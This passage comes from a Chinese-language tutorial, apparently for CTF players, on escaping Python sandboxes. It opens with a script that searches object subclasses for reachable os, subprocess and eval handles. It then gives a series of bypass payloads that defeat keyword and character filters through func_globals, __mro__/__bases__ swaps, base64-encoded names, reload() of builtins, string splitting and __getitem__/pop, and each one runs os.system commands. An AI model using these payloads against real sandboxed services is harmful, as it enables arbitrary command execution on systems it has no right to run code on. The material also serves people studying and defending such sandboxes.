                'code': ['sys', '__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'codeop': ['__builtins__'],
                'colorsys': ['__builtins__'], 'compileall': ['os', 'importlib', 'sys', '__builtins__'],
                'configparser': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'copy': ['__builtins__'], 'copyreg': ['__builtins__'], 'crypt': ['__builtins__'],
                'csv': ['__builtins__'], 'datetime': ['__builtins__'], 'decimal': ['__builtins__'],
                'difflib': ['__builtins__'], 'dis': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'],
                'dummy_threading': ['__builtins__'], 'enum': ['sys', '__builtins__'], 'filecmp': ['os', '__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], 'fnmatch': ['os', '__builtins__'],
                'formatter': ['sys', '__builtins__'], 'fractions': ['sys', '__builtins__'],
                'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'],
                'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'],
                'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'],
                'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'],
                'imp': ['os', 'importlib', 'sys', '__builtins__'],
                'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'],
                'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'],
                'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'],
                'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'],
                'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'],
                'nturl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'],
                'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'],
                'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'],
                'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'],
                'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'],
                'pkgutil': ['os', 'importlib', 'sys', '__builtins__'],
                'platform': ['os', 'platform', 'subprocess', 'sys', '__builtins__'],
                'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'],
                'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'pty': ['os', 'sys', '__builtins__'],
                'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'],
                'pyclbr': ['importlib', 'sys', '__builtins__'],
                'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'],
                'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'],
                'reprlib': ['__builtins__'], 'rlcompleter': ['__builtins__'],
                'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'],
                'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'],
                'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'],
                'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'],
                'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'],
                'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'],
                'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'],
                'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'],
                'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'],
                'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'],
                'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'],
                'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'],
                'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'],
                'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'],
                'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'],
                'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))
all_modules = list(set(list(find_modules.keys()) + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'>类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass
```

### 过滤__globals__

当__globals__被禁用时，

- 可以用func_globals直接替换；
- 使用__getattribute__(‘__globa’+’ls__‘)；

如：

```
# 原型是调用__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

# 如果过滤了__globals__，可直接替换为func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('calc')
# 也可以通过拼接字符串得到方式绕过
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")['__builtins__']['__import__']('os').system('calc')
```

### 过滤__mro__或__bases__或__base__

两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：

```
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
```

如：

```
# 三者互换均可
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')
```

### base64编码

对关键字进行base64编码可绕过一些明文检测机制：

```
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')
0
```

### reload()方法

某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：

```
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval>
```

### 字符串拼接

凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。

如：

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__bu'+'iltins__']['__impor'+'t__']('o'+'s').system('ca'+'lc')
```

### 过滤中括号

当中括号[]被过滤掉时，

- 调用__getitem__()函数直接替换；
- 调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；

如：

```
# 原型
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

# __getitem__()替换中括号[]
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')

# pop()替换中括号[]，结合__getitem__()利用
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('calc')
```

## 0x04 参考

[Python沙箱逃逸总结](https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/)

[Python 沙箱逃逸](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)

[python 沙箱逃逸](https://98587329.github.io/2018/06/06/python-沙箱逃逸/)